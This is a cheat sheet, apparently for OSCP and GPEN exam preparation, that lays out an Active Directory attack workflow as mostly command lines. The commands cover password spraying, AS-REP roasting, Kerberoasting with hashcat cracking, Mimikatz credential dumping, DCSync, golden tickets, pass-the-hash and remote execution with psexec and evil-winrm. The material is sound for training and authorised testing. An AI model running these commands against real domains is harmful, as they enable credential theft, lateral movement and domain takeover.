# Active Directory Attacks Cheat Sheet (OSCP / GPEN)

This cheat sheet provides a **structured workflow for attacking Active Directory environments** during **OSCP and GPEN exams**.

Active Directory compromises typically follow this path:

```
Initial Foothold → Enumeration → Credential Access → Lateral Movement → Privilege Escalation → Domain Dominance
```

AD attacks are **information-driven**, meaning proper enumeration is the key to success.

---

# 1. Identify Domain Information

Check current user and domain:

```powershell
whoami
whoami /all
echo %USERDOMAIN%
```

Check domain controller:

```powershell
nltest /dsgetdc:DOMAIN
```

---

# 2. Basic Domain Enumeration

List domain users:

```powershell
net user /domain
```

List domain groups:

```powershell
net group /domain
```

Check Domain Admins:

```powershell
net group "Domain Admins" /domain
```

List domain computers:

```powershell
net view /domain
```

---

# 3. Password Policy Enumeration

Check password policy:

```powershell
net accounts /domain
```

Look for:

```
minimum password length
lockout threshold
password complexity
```

---

# 4. SMB Enumeration

List shares:

```bash
smbclient -L //TARGET -N
```

Using CrackMapExec:

```bash
crackmapexec smb TARGET
```

Enumerate users:

```bash
crackmapexec smb TARGET --users
```

---

# 5. Kerberos User Enumeration

Use Kerbrute:

```bash
kerbrute userenum users.txt -d domain.local
```

---

# 6. Password Spraying

Test weak passwords across users.

Example:

```bash
crackmapexec smb TARGET -u users.txt -p Winter2023!
```

Kerberos spray:

```bash
kerbrute passwordspray users.txt password -d domain.local
```

---

# 7. AS-REP Roasting

Occurs when **Kerberos pre-authentication is disabled**.

Find vulnerable users:

```bash
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass
```

Output:

```
$krb5asrep$ hash
```

Crack with Hashcat:

```bash
hashcat -m 18200 hash.txt rockyou.txt
```

---

# 8. Kerberoasting

Targets **service accounts with SPNs**.

Find SPNs:

```bash
GetUserSPNs.py domain.local/user:password
```

Example output:

```
$krb5tgs$ hash
```

Crack hash:

```bash
hashcat -m 13100 hash.txt rockyou.txt
```

---

# 9. BloodHound Enumeration

Collect domain data.

Run SharpHound:

```powershell
SharpHound.exe -c All
```

Upload results to BloodHound.

BloodHound identifies:

```
privilege escalation paths
admin relationships
trust relationships
```

---

# 10. Lateral Movement

Common methods:

```
SMB
WMI
WinRM
RDP
```

---

# 11. Pass-the-Hash

Use NTLM hash for authentication.

Example:

```bash
crackmapexec smb TARGET -u administrator -H HASH
```

Using Impacket:

```bash
psexec.py administrator@TARGET -hashes HASH
```

---

# 12. Pass-the-Ticket

Use Kerberos tickets for authentication.

Tools:

```
Rubeus
Mimikatz
```

Inject ticket:

```
kerberos::ptt ticket.kirbi
```

---

# 13. Credential Dumping

Use Mimikatz.

Start:

```
privilege::debug
```

Dump credentials:

```
sekurlsa::logonpasswords
```

Dump hashes:

```
lsadump::sam
```

---

# 14. DCSync Attack

Allows attacker to retrieve password hashes from domain controller.

Command:

```
lsadump::dcsync /domain:DOMAIN /user:Administrator
```

---

# 15. Golden Ticket Attack

Create forged Kerberos ticket.

Requirements:

```
krbtgt hash
domain SID
```

Generate ticket:

```
kerberos::golden
```

---

# 16. Silver Ticket Attack

Forge service ticket.

Targets:

```
CIFS
HTTP
MSSQL
```

---

# 17. Admin Session Hunting

Find where administrators are logged in.

Example:

```bash
crackmapexec smb TARGET --sessions
```

---

# 18. Share Enumeration

Search shares for sensitive data.

Example:

```bash
smbclient //TARGET/share
```

Look for:

```
password files
backups
scripts
```

---

# 19. WinRM Access

Check WinRM:

```bash
crackmapexec winrm TARGET
```

Connect:

```bash
evil-winrm -i TARGET -u user -p password
```

---

# 20. WMI Command Execution

Execute commands remotely.

```bash
wmiexec.py domain/user:password@TARGET
```

---

# 21. PsExec Execution

Execute commands via SMB.

```bash
psexec.py domain/user:password@TARGET
```

---

# 22. Domain Trust Enumeration

Check domain trusts:

```powershell
nltest /domain_trusts
```

PowerShell:

```powershell
Get-ADTrust
```

---

# 23. GPO Enumeration

List group policies:

```powershell
Get-GPO -All
```

Look for misconfigured policies.

---

# 24. Sensitive File Discovery

Search shares for credentials.

Example filenames:

```
password.txt
backup.zip
config.xml
```

---

# 25. Important Tools for AD Attacks

Common tools:

```
BloodHound
SharpHound
CrackMapExec
Kerbrute
Impacket
Mimikatz
Rubeus
```

---

# 26. Common AD Attack Techniques

Typical attacks:

```
Password spraying
Kerberoasting
AS-REP roasting
Pass-the-hash
Pass-the-ticket
DCSync
Golden ticket
```

---

# 27. Quick AD Attack Workflow

```
1. Enumerate domain
2. Identify users
3. Password spray
4. Kerberoast
5. Dump credentials
6. Move laterally
7. Escalate privileges
```

---

# 28. Quick Commands

Enumerate users:

```bash
net user /domain
```

Kerberoast:

```bash
GetUserSPNs.py domain/user:pass
```

Password spray:

```bash
crackmapexec smb TARGET -u users.txt -p password
```

BloodHound:

```bash
SharpHound.exe -c All
```

---

# 29. Common Ports in Active Directory

Important ports:

```
88   Kerberos
135  RPC
139  NetBIOS
389  LDAP
445  SMB
464  Kerberos password change
636  LDAPS
3268 Global catalog
3389 RDP
5985 WinRM
```

---

# 30. Final Advice

Active Directory attacks are **enumeration-heavy**.

Always ask:

```
Who has admin rights?
Where are credentials stored?
Where can I move laterally?
```

The domain environment usually **contains the path to Domain Admin — you just need to find it**.
